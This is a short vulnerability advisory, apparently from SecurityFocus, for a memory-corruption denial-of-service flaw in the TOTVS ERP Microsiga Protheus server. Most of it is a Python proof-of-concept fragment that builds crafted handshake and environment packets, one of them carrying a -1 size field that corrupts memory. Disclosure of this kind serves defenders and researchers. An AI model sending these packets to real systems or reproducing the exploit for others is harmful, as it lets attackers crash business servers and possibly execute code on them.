source: http://www.securityfocus.com/bid/47342/info

TOTVS ERP Microsiga Protheus is prone to a denial-of-service vulnerability due to a memory-corruption issue.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users. Due to the nature of this issue, arbitrary code execution may be possible; however, this has not been confirmed. 

--- CODE SNIPPET BEGIN ---
if options.target == 8:
      version = "20081215030344"
else:
      version = "20100812040605"

packet_handshake = (
      "%14s"
      "\x00\x01"
      "%36s\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "%32s\x00"
      "%s\x00"
      "\x00\x00\x14\x01"
) % ("A"*14, "B"*36, "C"*32, version)

packet_environ = (
      "\x42\x00\x00\x00\x21\xab\x42\x00\x00\x00"
      "\xff\xff\xff\xff" # Memory Corruption (-1 as size)
#      "\x38\x00\x00\x00" # OK (56 bytes)
      "\x01\x00\x3e\x82\x01\x03\x02\x04\x00\x00"
      "\x00\x00%7s\x00\x00\x00\x00\x00\x00"
      "%11s\x00\x00\x00\x00\x00\x00"
      "\x01\x00\x00\x05\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00"
) % ("D"*7, "E"*11)
--- CODE SNIPPET END ---
